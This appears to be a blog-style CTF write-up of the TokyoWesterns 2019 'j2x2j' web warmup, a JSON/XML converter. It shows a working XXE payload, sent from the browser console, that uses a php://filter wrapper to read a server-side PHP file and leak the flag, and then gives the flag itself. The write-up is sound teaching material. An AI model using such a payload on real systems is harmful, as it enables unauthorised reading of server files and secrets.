---
layout: post
title: "TokyoWesterns CTF 5th 2019: Web - j2x2j"
modified: 2019-09-03
tags: twctf, twctf2019quals, web
---

This was a simple JSON-to-XML / XML-to-JSON converter. The challenge was categorized as "warmup", so to my not-that-big surprise the most basic XXE vulnerability worked as expected:

I used the following code (written into Chrome's console) to leak the flag:

{% highlight javascript %}
$.post('/', { xml: `<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT leak ANY><!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///var/www/html/flag.php">]><root><leak>&xxe;</leak></root>` }, function(data) { $('#json').val(atob(JSON.parse(data).leak)); });
{% endhighlight %}

The flag was:

{% highlight text %}
TWCTF{t1ny_XXE_st1ll_ex1sts_everywhere}
{% endhighlight %}
